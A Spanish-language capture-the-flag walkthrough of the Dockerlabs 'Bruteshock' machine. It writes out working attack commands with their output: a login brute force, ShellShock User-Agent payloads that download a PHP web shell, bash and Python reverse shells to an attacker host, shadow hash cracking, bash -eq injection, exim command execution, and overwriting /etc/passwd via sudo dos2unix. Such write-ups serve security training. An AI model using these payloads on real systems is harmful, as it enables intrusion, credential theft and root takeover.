---
title: Bruteshock - Medium (Dockerlabs)
permalink: /Bruteshock-Dockerlabs-Writeup/
tags:
  - "Linux"
  - "Medium"
  - "Hash Cracking"
  - "Bash eq"
  - "Command Injection"
  - "Sudoers"
  - "Exim"
  - "Dos2Unix"
categories:
  - writeup
  - hacking
  - dockerlabs
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Bruteshock - Medium (Dockerlabs)
seo_description: Pon en práctica explotación ShellShock, fuerza bruta y explotación de privilegios en Linux para vencer Bruteshock.
excerpt: Pon en práctica explotación ShellShock, fuerza bruta y explotación de privilegios en Linux para vencer Bruteshock.
header:
  overlay_image: /assets/images/headers/bruteshock-dockerlabs.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/bruteshock-dockerlabs.jpg
---

![image-center](/assets/images/posts/bruteshock-dockerlabs.png){: .align-center}

**Habilidades:** Login Page Brute Force Attack, ShellShock Attack - Remote Code Execution, User Shadow Hash Cracking using `john`, Bash `eq` Comparison Code Execution - [Privilege Escalation], Abusing `exim` Privileges in Sudoers - [Privilege Escalation],  Abusing Sudoers Privileges - `dos2unix` (Overwriting the `/etc/passwd` File) [Privilege Escalation]
{: .notice--primary}


# Introducción

Bruteshock es una máquina Linux de la plataforma de Dockerlabs de dificultad Media. En esta máquina aprenderemos a explotar la vulnerabilidad `shellshock` en una aplicación web alojada en un contenedor de Docker, ganar acceso al sistema se volverá todo un desafío. Además explotaremos conceptos relacionados con privilegios asignados a scripts y binarios en Linux para poco a poco elevar nuestros privilegios para ganar control total sobre el sistema.

<br>


# Reconocimiento
---
Haremos una traza ICMP para comprobar que la máquina víctima esté activa

~~~ bash
ping -c 1 bruteshock.dl
PING bruteshock.dl (172.17.0.2) 56(84) bytes of data.
64 bytes from bruteshock.dl (172.17.0.2): icmp_seq=1 ttl=64 time=0.093 ms

--- bruteshock.dl ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.093/0.093/0.093/0.000 ms
~~~

## Nmap Scanning 

Haremos un primer escaneo por el protocolo TCP, con el fin de descubrir puertos abiertos, si no encontráramos información relevante, haríamos escaneos por otros protocolos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn bruteshock.dl -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 13:56 EDT
Nmap scan report for bruteshock.dl (172.17.0.2)
Host is up (0.000010s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

Ahora haremos un escaneo de servicios para detectar la versión y el tipo de servicio que se ejecuta en los puertos que hemos encontrado

~~~ bash
nmap -p 80 -sVC bruteshock.dl -oN services                                                                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 13:56 EDT
Nmap scan report for bruteshock.dl (172.17.0.2)
Host is up (0.000055s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: uso de scripts de reconocimiento para identificar posibles vulnerabilidades conocidas
- `-oN`: Exportar en formato `nmap` (se vea igual que el output de nmap)


## Web Analysis

En este caso solamente tendríamos un puerto abierto, que correspondería al puerto `80` (HTTP). Usaremos la herramienta `whatweb` para detectar las tecnologías que se están ejecutando en el servidor web

~~~ bash
whatweb http://bruteshock.dl   
http://bruteshock.dl [403 Forbidden] Apache[2.4.62], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2]
~~~

Nos reporta un error `403`, esto quiere decir que no estamos autorizados a ver el contenido. Si visitamos la web a primera vista no vemos gran cosa, hasta que recargamos y nos muestra una web supuestamente privada

![image-center](/assets/images/posts/bruteshock-web-analysis.png){: .align-center}

Cuando presionamos `F5`, estamos especificando a la NSA el código secreto para que nos concedan acceso al login de la página que de primeras sería inaccesible (sarcasmo)

![image-center](/assets/images/posts/bruteshock-web-analysis-2.png){: .align-center}

Esto ocurre porque se cuando iniciamos por primera vez no nos carga la cookie `cookie` de PHP (`PHPSESSID`) 

~~~ bash
curl -I http://bruteshock.dl
HTTP/1.0 403 Forbidden
Date: Fri, 28 Mar 2025 18:02:05 GMT
Server: Apache/2.4.62 (Debian)
Set-Cookie: PHPSESSID=q2srkbctkotmpqecc9j7r3mpqa; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8

# Ahora enviamos la Cookie de sesión que conseguimos con la primera solicitud
curl -I http://bruteshock.dl -H 'Cookie: PHPSESSID=q2srkbctkotmpqecc9j7r3mpqa'
HTTP/1.1 200 OK
Date: Fri, 28 Mar 2025 18:02:20 GMT
Server: Apache/2.4.62 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
~~~

Entonces si usamos la cookie que nos proporcionó en el navegador, ahora tendremos acceso al contenido. Ahora podemos hacer el escaneo que hicimos antes con `whatweb`

~~~ bash
whatweb http://bruteshock.dl -H 'Cookie: PHPSESSID=q2srkbctkotmpqecc9j7r3mpqa'
http://bruteshock.dl [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], PasswordField[password], Title[Web Privada]
~~~


## Fuzzing

Como no vemos algún recurso del que podamos abusar directamente, haremos `fuzzing` para descubrir directorios o archivos interesantes, lo haremos con la herramienta `wfuzz`

~~~ bash
wfuzz -c --hc=404 -b 'PHPSESSID=p94n4hgjjvq1ti9f7relhhdh06' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://bruteshock.dl/FUZZ
~~~

- `-c`: Formato colorizado
- `--hc=404`: Ocultamos las respuestas con el código de estado `404`
- `-H`: Definir una cabecera `HTTP`, en este caso es necesario enviar el valor de la `cookie` de sesión 
- `-w`: Diccionario de palabras a usar
- `-t 200`: Definimos 200 subprocesos para agilizar el proceso de `fuzzing`

Pero no obtendremos resultados interesantes, en este punto podemos intentar hacer un ataque de fuerza bruta para intentar descubrir alguna contraseña en el `login`



# Intrusión / Explotación
---
## Login Page Brute Forcing

Primeramente podemos intentar hallar la contraseña de un usuario `admin` (nombre común en sistemas) a través de un ataque de fuerza bruta al panel de autenticación usando `wfuzz`, si no tenemos éxito podemos intentar adivinar un nombre de usuario válido, aunq

~~~ bash
wfuzz -c --hl 69 -b "PHPSESSID=q2srkbctkotmpqecc9j7r3mpqa" -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -t 200 http://bruteshock.dl
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bruteshock.dl/
Total requests: 14344392
=====================================================================
ID           Response   Lines    Word       Chars       Payload    
=====================================================================
000013635:   200        0 L      5 W        119 Ch      "christelle" 
~~~

- `--hl 69`: Ocultamos las respuestas con `69` líneas
- `-H`: Especificamos una cabecera HTTP
- `-d`: Definimos el contenido de los datos que enviaremos

En este caso, cada respuesta fallida posee un total de `69` líneas y un código de estado exitoso (`200`), es por eso que en vez de filtrar por código de estado, filtramos por la cantidad de líneas

~~~ bash
curl -sX POST http://bruteshock.dl -H 'Cookie: PHPSESSID=q2srkbctkotmpqecc9j7r3mpqa' -d 'username=test&password=test' | wc -l

69
~~~

En este caso hemos encontrado una contraseña `christelle` supuestamente válida para el usuario `admin`. Si iniciamos sesión, nos salta este recuadro con un mensaje del éxito

![image-center](/assets/images/posts/bruteshock-login-success.png){: .align-center}

Nos redirige a este nuevo panel con la URL `http://bruteshock.dl/pruebasUltraSecretas`

![image-center](/assets/images/posts/bruteshock-google-clon.png){: .align-center}

Podemos ver que nos reporta un mensaje que dice: `User-Agent almacenado en el log`, lo que nos puede ayudar en nuestra explotación al ser una posible pista


## ShellShock Attack

Este es un ataque que se lleva a cabo a través de la cabecera `User-Agent` , un bug de `bash` que permite la ejecución remota de comandos, una detección para esta máquina sería la siguiente

- Habilitaremos un servidor HTTP con `python` a modo de recibir solicitudes

~~~ bash
python3 -m http.server 80                                                      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Ejecutamos esta solicitud `http` para la URL `http://bruteshock.local/pruebasUltraSecretas`

~~~ bash
curl -IX GET http://bruteshock.dl/pruebasUltraSecretas/ -A "() { :; }; curl http://172.17.0.1/test" 

HTTP/1.1 200 OK
Date: Fri, 28 Mar 2025 18:18:50 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Length: 1873
Content-Type: text/html; charset=UTF-8
~~~

![image-center](/assets/images/posts/bruteshock-shellshock.png){: .align-center}

Aprovecha el bug Willy!. En el ejemplo anterior estaríamos intentando enviarnos una solicitud HTTP a nuestro servidor `python3`. Es cuando el payload se ejecuta correctamente y envía una solicitud a nuestro servidor solicitando un archivo `test`

### Uploading Malicious `php`File

Aprovechando este bug podremos enviar una `reverse shell` a nuestra máquina atacante, para ello crearemos un archivo que usaremos para ejecutar comandos, nos ayudaremos de `Brupsuite` o `curl`

Archivo `rce.php`
 
~~~ bash
echo '<?php system($_GET["cmd"]); ?>' > rce.php
~~~

Modificaremos el `User-Agent` y enviaremos la siguiente solicitud, pero primero tendremos un servidor HTTP con `python3`

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Usaremos la misma solicitud HTTP que usamos como prueba de concepto y solicitaremos nuestro archivo `php` malicioso

~~~ bash
curl -IX GET http://bruteshock.dl/pruebasUltraSecretas/ -A "() { :; }; curl http://172.17.0.1/rce.php -o rce.php"
HTTP/1.1 200 OK
Date: Fri, 28 Mar 2025 18:21:31 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Length: 1873
Content-Type: text/html; charset=UTF-8
~~~

En nuestro servidor HTTP deberíamos ver un `GET` a nuestro archivo `rce.php`

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [29/Mar/2025 10:20:42] "GET /rce.php HTTP/1.1" 200 -
~~~


## Shellshock - RCE

Ahora mediante la web accedemos al archivo `rce.php`, podemos hacerlo o bien desde la web o mediante `curl`

~~~ bash
curl -X GET 'http://bruteshock.dl/pruebasUltraSecretas/rce.php?cmd=id'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Así se vería si hacemos la solicitud mediante el navegador

![image-center](/assets/images/posts/bruteshock-rce-web.png){: .align-center}


## Shell as `www-data` (Failed)

Podemos intentar enviarnos una `shell` mediante este parámetro, para ello modificaremos el siguiente payload

~~~ bash
bash -c "bash -i >&/dev/tcp/10.88.0.1/443 0>&1"
~~~

![image-center](/assets/images/posts/bruteshock-rce-web-2.png){: .align-center}

Nota que cambié el caracter `&` por `%26` para que pueda ejecutarse correctamente en el servidor

![image-center](/assets/images/posts/bruteshock-revshell-fail.png){: .align-center}

Si entramos de esta forma al poco tiempo de establecer la `shell`, nos concluye la conexión, esto puede ser porque el servidor está bloqueando ciertos tipos de conexiones

### `python` Reverse Shell

Usaremos una `reverse shell` con `python3` para no depender de un TTY y abrir directamente un socket a nuestra máquina atacante, el comando sería el siguiente

~~~ bash
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("172.17.0.1",4646)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
~~~

Posteriormente lanzaremos una pseudo-terminal usando python. Ahora deberíamos poder tener una `shell` más interactiva

~~~ bash
nc -lvnp 4646
listening on [any] 4646 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38166
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell

www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$ python3 -c 'import pty; pty.spawn("/bin/bash")'

<as$ python3 -c 'import pty; pty.spawn("/bin/bash")'      
www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$
~~~



# Escalada de privilegios
---
## TTY Treatment

Si hacemos el tratamiento de la TTY de la forma clásica, es posible que se interrumpa la conexión. Es por esto que usaremos `python` para lanzar una pseudo consola

- Mantendremos el uso de la variable `TERM` establecido con el valor `xterm` para poder limpiar la pantalla, lo fastidioso en este caso sería que debemos usar el comando `clear` en vez de `Ctrl + L`

~~~ bash
www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<as$ python3 -c 'import pty; pty.spawn("/bin/bash")'      
www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$ export TERM=xterm
export TERM=xterm
www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$ ^Z
[1]  + 131393 suspended  nc -lvnp 4646
incommatose@parrot~$ stty raw -echo; fg
[1]  + 131393 continued  nc -lvnp 4646
                                      reset xterm
~~~

Finalmente ajustamos las proporciones al tamaño de la terminal para poder tener una visualización más cómoda

~~~ bash
stty rows 44 columns 189
~~~

Vemos un recurso `IMPORTANTE.txt` en `/`, veamos su contenido

~~~ bash
www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$ ls /
IMPORTANTE.txt	bin  boot  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var
www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$ cat /IMPORTANTE.txt
cat /IMPORTANTE.txt
Importantisimo ver nuestros github:

DarksBlack:
https://github.com/DarksBlackSk/

maciiii___:
https://github.com/Maciferna/
~~~


## (Posible) Sudoers Privileges 

Listaremos los privilegios que tengamos asignados con `sudo` para ver si tenemos capacidad para ejecutar un archivo. Cuidado con hacer este comando porque se nos va la shell pal carajo si presionamos `Ctrl + C`

~~~ bash
www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$ sudo -l
sudo -l
[sudo] password for www-data: 
~~~

Nos pide la contraseña del usuario `www-data`, pero como no la tenemos, seguiremos buscando otra forma de escalar


## (Posible) SUID Binaries

Listaremos aquellos binarios los cuales tengan asignado el permiso `suid` asignado

~~~ bash
www-data@5c050710a415:/var/www/html/pruebasUltraSecretas$ find / -perm -4000 2>/dev/null

/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4
~~~

Vemos que existe `exim4`, pero esta versión no sería vulnerable a algún `CVE` reportado. Iremos a la carpeta `/home` para ver si podemos ver el contenido de algún usuario

~~~ bash
www-data@5c050710a415:/home$ ls -la 
ls -la
total 0
drwxr-xr-x 1 root       root        36 Nov  1 03:28 .
drwxr-xr-x 1 root       root       180 Mar 29 14:16 ..
drwx------ 1 darksblack darksblack  92 Nov  1 04:37 darksblack
drwxr-xr-x 1 maci       maci        56 Nov  1 04:42 maci
drwx------ 1 pepe       pepe        92 Nov  2 05:58 pepe
~~~

Tendríamos permisos solamente en la carpeta `maci`. Existe un script de `bash` llamado `script.sh` en la carpeta del usuario `maci`, y al parecer podemos ejecutarlo

~~~ bash
www-data@5c050710a415:/home$ ls -la maci
ls -la maci
total 8
drwxr-xr-x 1 maci maci  56 Nov  1 04:42 .
drwxr-xr-x 1 root root  36 Nov  1 03:28 ..
lrwxrwxrwx 1 root root   9 Nov  1 03:16 .bash_history -> /dev/null
drwxr-xr-x 1 maci maci  10 Nov  1 04:32 .local
-rwxr-xr-x 1 maci maci 104 Nov  1 04:42 script.sh
~~~


## (Posible) Bash `eq` Code Execution

Existe una forma de escalar privilegios mediante el uso de la comparación `-eq` de `bash`, donde el uso de doble corchetes permite inyectar un comando (`[[ $num -eq 123123 ]]`)

~~~ bash
www-data@5c050710a415:/home/maci$ cat script.sh
cat script.sh
#!/bin/bash

read -rp "Adivina: " num

if [[ $num -eq 123123 ]]
then
  echo "Si"
else
  echo "ERROR"
fi
~~~

- `if [[ $num -eq 123123 ]]` Sería la sentencia de la podríamos abusar para elevar nuestros privilegios

El script se comporta de la siguiente manera si lo ejecutamos normalmente

~~~ bash
www-data@5c050710a415:/home/maci$ ./script.sh
./script.sh
Adivina: 1
1
ERROR
~~~

Para aprovechar esto y escalar privilegios, ejecutaremos el script como el usuario propietario

~~~ bash
sudo -u maci ./script.sh
~~~

Cuando nos pida adivinar pegaremos lo siguiente

~~~ bash
Adivina: a[$(/bin/bash >&2)]+42
a[$(/bin/bash >&2)]+42
www-data@5c050710a415:/home/maci$ 
~~~

Pero tendremos un problemita, **no conocemos la contraseña para el usuario `www-data`**, por lo que necesitamos disponer de credenciales válidas para ejecutar este recurso. **No nos será posible escalar nuestros privilegios usando este método**, así que buscaremos otras formas para migrar a otro usuario


## System Enumeration - Readable Files

Buscaremos archivos en el sistema cuyo miembro sea cada usuario en cuestión

~~~ bash
www-data@5c050710a415:/home/maci$ find / -user "darksblack" -readable 2>/dev/null              
/var/backups/darksblack
/var/backups/darksblack/.darksblack.txt
~~~

- `-user`: Usuario propietario
- `-readable`: Capacidad de lectura

Si inspeccionamos el archivo vemos lo siguiente

~~~ bash
www-data@5c050710a415:/home/maci$ cat /var/backups/darksblack/.darksblack.txt

darksblack:$y$j9T$LHiaZ3.V.uZMQWNKIHQaK.$yucUM837WonVbazf5eQWEmFnG5u0ZY5VTxH37NhaCE5:20028:0:99999:7:::
~~~


## Shadow Hash Cracking

Parece ser el `hash` del archivo `/etc/shadow` para el usuario `darksblack`, intentaremos crackear este hash usando la herramienta `john`. Copiaremos el hash y lo guardaremos en un archivo `hash.txt` (por ejemplo)

~~~ bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
salvador1        (darksblack)     
1g 0:00:02:11 DONE (2025-03-29 11:59) 0.007620g/s 119.2p/s 119.2c/s 119.2C/s elizabeth3..nissan350z
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

- `--format=crypt`: Detectar el algoritmo usado de forma automática para Unix
- `--wordlist`: Especificamos el diccionario a usar para crackear el hash


## Shell as `darksblack`

Hemos encontrado la contraseña `salvador1` para el usuario `darksblack`, por lo que ya podemos migrar a este usuario

~~~ bash
www-data@5c050710a415:/home/maci$ su darksblack
Password:
www-darksblack@5c050710a415:/home/maci$
~~~


## Sudoers Privileges - `script.sh`

Inicialmente comprobaremos los privilegios `sudo` para este nuevo usuario

~~~ bash
darksblack@5c050710a415:/home/maci$ sudo -l
sudo -l
Matching Defaults entries for darksblack on 5c050710a415:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User darksblack may run the following commands on 5c050710a415:
    (maci) NOPASSWD: /home/maci/script.sh
~~~


## Shell as `maci` - Bash `eq`

Podemos ejecutar el `script.sh` que descubrimos anteriormente, por lo que ahora intentamos elevar nuestro privilegio usando `sudo`

~~~ bash
darksblack@5c050710a415:/home/maci$ sudo -u maci ./script.sh

Adivina: a[$(/bin/sh >&2)]+42
$ whoami
maci
$ id
uid=1000(maci) gid=1000(maci) groups=1000(maci)
~~~

Recordemos que el payload que usamos es el siguiente

~~~ bash
a[$(/bin/sh >&2)]+42
~~~

- `a[]`: Estamos haciendo una llamada a un array `a`
- `$()`: Usamos esta sintaxis para referirnos a un comando a nivel de sistema
- `/bin/sh >&2`: Lanza una `bash` y redirige la salida estándar al `stderr`, esto no afecta al funcionamiento de la consola

Entendiendo cada parte del payload, estaríamos ejecutando una `sh` en el valor de entrada del script. 

- Para volver a una consola de `bash`, simplemente escribimos `bash`


## Sudoers Privileges - `exim`

Listaremos los privilegios `sudo` que tenemos asignados para el usuario actual

~~~ bash
maci@5c050710a415:~$ sudo -l

Matching Defaults entries for maci on 5c050710a415:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User maci may run the following commands on 5c050710a415:
    (pepe) NOPASSWD: /usr/sbin/exim
~~~

Podemos ejecutar `exim` como el usuario `pepe`, por lo que podemos intentar ejecutar `bash` como este usuario, para ejecutar algún comando a través de `exim`, podemos hacerlo mediante el siguiente comando

~~~ bash
exim -be '${run{/usr/bin/id}}'
~~~

Crearemos un recurso que nos envíe una consola como el usuario `pepe`. Para esto, podemos hacer uso de un pequeño script que envíe un socket con `python3`

 ~~~ python
import socket, subprocess, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.17.0.1", 443))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
 ~~~

Enviaremos esto a un archivo `privesc` en el directorio `/tmp`, lo haremos de la siguiente manera

~~~ bash
maci@5c050710a415:/var/www/html/pruebasUltraSecretas$ echo "aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MsIHB0eQpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxNzIuMTcuMC4xIiwgNDQzKSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpvcy5kdXAyKHMuZmlsZW5vKCksIDEpCm9zLmR1cDIocy5maWxlbm8oKSwgMikKcHR5LnNwYXduKCIvYmluL2Jhc2giKQ==" | base64 -d > /tmp/privesc.py && chmod +x /tmp/privesc.py
~~~ 

### Shell as `pepe`

Nos ponemos en escucha con `nc` por el puerto `443` para recibir la `shell`

~~~ bash
nc -lvnp 443
~~~

Ejecutamos la reverse shell que creamos anteriormente abusando de la capacidad que tenemos de ejecutar `exim` como el usuario pepe de la siguiente forma

~~~ bash
sudo -u pepe exim -be '${run{/bin/bash -c "python3 /tmp/privesc.py"}}'
~~~

Y estaríamos conectados como el usuario `pepe`, ahora finalmente nos queda escalar a `root`

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33484
pepe@5c050710a415:/$ id
uid=1002(pepe) gid=1002(pepe) groups=1002(pepe),100(users)
pepe@5c050710a415:/$ 
~~~


## Getting a Fully TTY

Hacemos un tratamiento de la TTY para poder hacer `Ctrl + C` y `Ctrl + L`, lo haremos cómodamente a través de `python3`, porque con el comando `script` la shell nos dice: "Hasta la próximaaaa..."

~~~ bash
pepe@5c050710a415:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
pepe@5c050710a415:/$ export TERM=xterm
export TERM=xterm
pepe@5c050710a415:/$ export SHELL=/bin/bash
export SHELL=/bin/bash
pepe@5c050710a415:/$ ^Z
[1]  + 212803 suspended  nc -lvnp 443
root@parrot exploits # stty raw -echo;fg
[1]  + 212803 continued  nc -lvnp 443
                                     reset xterm
pepe@5c050710a415:/$ stty columns 189 rows 44
~~~


## Sudoers Privileges - `dos2unix`

Listaremos nuestros privilegios `sudo` para ver si tenemos acceso a un recurso nuevo el cual podamos explotar para elevar nuestros privilegios

~~~ bash
pepe@5c050710a415:/$ sudo -l
Matching Defaults entries for pepe on 5c050710a415:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User pepe may run the following commands on 5c050710a415:
    (ALL : ALL) NOPASSWD: /usr/bin/dos2unix
~~~

Tenemos capacidad de ejecutar `dos2unix` sin proporcionar contraseña y como cualquier usuario. Con la capacidad de escritura de archivos con `dos2unix`, podemos llevar a cabo una escalada de privilegios mediante una escritura privilegiada

![image-center](/assets/images/posts/bruteshock-dos2unix-gtfobins.png){: .align-center}

Usaremos el contenido de `/etc/passwd` para nuestra escalada, primeramente hacemos una copia del `/etc/passwd` en algún directorio como `/tmp`

**Necesitamos que la línea del archivo donde se encuentra `root` esté sin la letra `x`, al eliminar la "x" en el campo de contraseña de `root`, indicaríamos al sistema que `root` no tiene contraseña almacenada en `/etc/shadow`. Esto dejaría la cuenta `root` accesible sin contraseña**

Entonces creamos un nuevo archivo en el directorio `/tmp`, aplicando dicha teoría

~~~ bash
pepe@5c050710a415:/$ cat /etc/passwd | grep root | tr -d 'x' > /tmp/passwd
pepe@5c050710a415:/$ cat /etc/passwd | grep -v root >> /tmp/passwd
~~~

Y el archivo `/tmp/passwd` debería verse de la siguiente manera, con la línea del usuario `root` sin la `x` correspondiente

![image-center](/assets/images/posts/bruteshock-passwd-modified.png){: .align-center}


## Root time - Overwriting the `/etc/passwd` File

Ahora preparamos el entorno para usar ambos archivos en nuestra escalada de privilegios

~~~ bash
pepe@5c050710a415:/$ passwd_new=/tmp/passwd
pepe@5c050710a415:/$ passwd_old=/etc/passwd
~~~

Ejecutamos `dos2unix` con `sudo` y usando ambos archivos

~~~ bash
pepe@5c050710a415:/$ sudo /usr/bin/dos2unix -f -n "$passwd_new" "$passwd_old"
dos2unix: converting file /tmp/passwd to file /etc/passwd in Unix format...
~~~

Finalmente cambiamos al usuario `root` con el comando `su`

~~~ text
pepe@5c050710a415:/$ su

root@5c050710a415:/# id
uid=0(root) gid=0(root) groups=0(root)
~~~



